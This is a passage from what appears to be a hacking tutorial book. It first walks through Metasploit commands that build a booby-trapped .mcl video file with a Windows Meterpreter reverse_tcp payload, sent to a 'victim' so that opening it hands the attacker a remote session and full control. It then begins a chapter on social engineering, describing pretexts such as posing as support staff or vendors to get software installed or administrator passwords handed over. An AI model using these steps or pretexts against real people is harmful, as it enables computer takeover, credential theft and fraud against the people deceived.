    msf > set FILENAME worlds_smallest_laptop_ever.mcl


    msf > set FILE_NAME smallest_laptop.exe


    The next step is to set the payload using Windows Meterpreter:


    msf > set PAYLOAD windows/meterpreter/reverse_tcp


    msf > exploit


    The file that needs to be sent to the victim can be found in /root/msf4/local/worlds_smallest_laptop_ever.mcl.


    Now that the .mcl file has been created in Metasploit and a share has been opened
    on the network, the file is ready to be sent to the victim.


    As soon as the victim opens the .mcl file to watch the video about the world’s
    smallest laptop ever, the file will link back to your Kali system and open a Meterpreter
    session. If the session does not open automatically, type:


    msf > sessions -1


    Once the Meterpreter session opens on your computer, you can pretty much do anything
    on the victim’s system. You have full control of the victim’s system, especially
    if the individual who clicked the file is the administrator. If a guest user clicked
    it, then you will only have guest user privileges.


    # Chapter 7: Social Engineering Hacking


    Hacking using social engineering is all about taking advantage of the weakest
    component of every organization’s security - its people. In other words, social
    engineering is hacking the people rather than the system itself. The technique
    used is gaining the trust of people in order to maliciously exploit them and get
    information for profit.


    Social engineering can be a very difficult hack to pull off, considering the boldness
    and skill it requires getting a total stranger to trust you. However, it is also
    the hardest hack to prevent because every individual is responsible for his or
    her own security decisions.


    Social engineering is carried out when a malicious hacker pretends to be somebody
    else in order to acquire information that would be difficult to get by other means.
    The information acquired from the victim can then be used to steal files, destroy
    resources, commit fraud, or spy on an organization. Social engineering is distinct
    from physical security hack attempts, but they are normally carried out together.


    Examples of social engineering include:


    Support personnel - Hackers claim that they require a user to install a software
    patch or update. They convince the victim to download the software, and the hackers
    are then able to remotely access the victim’s system.


    Product vendors - Hackers pose as vendors of a particular product that the organization
    relies on, for example, the phone system or accounting software. They claim they
    need to update the existing systems and request administrator passwords.


    Employees - Some employees may pretend that they have misplaced their access badges
    for accessing the organization’s data center. They inform the security department,
    who hand them keys, only for them to gain unauthorized entry to digital and physical
    records.


    Phishing - Criminal hackers send malicious emails with links that trigger malware
    and viruses to be downloaded onto the victim’s computer. They are thus able to
    gain control of the system and steal data.


    ## Performing Social Engineering Hacks'
